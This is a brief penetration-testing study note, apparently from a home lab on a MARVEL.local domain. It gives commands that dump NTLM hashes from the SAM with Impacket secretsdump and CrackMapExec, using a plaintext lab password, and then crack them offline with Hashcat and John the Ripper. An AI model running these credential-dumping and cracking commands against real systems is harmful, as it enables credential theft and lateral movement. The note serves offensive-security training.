# DUMPING AND CRACKING HASHES

Extract NTLM hashes from compromised systems and crack them offline for lateral movement and privilege escalation.

## Using Impacket Secretsdump

Dump SAM hashes from compromised machine:

```bash
impacket-secretsdump MARVEL.local:fcastle@10.0.2.16
```

## Using CrackMapExec

Dump hashes across the network:

```bash
crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
crackmapexec smb 10.0.2.0/24 -u fcastle -H hash -sam
```

## Hash Cracking

### Hashcat

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Hashcat modes:
- `m 1000` - NTLM (Windows)
- `m 5500` - NetNTLMv1  
- `m 5600` - NetNTLMv2

### John the Ripper

```bash
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

![[Pasted image 20260405194706.png]]
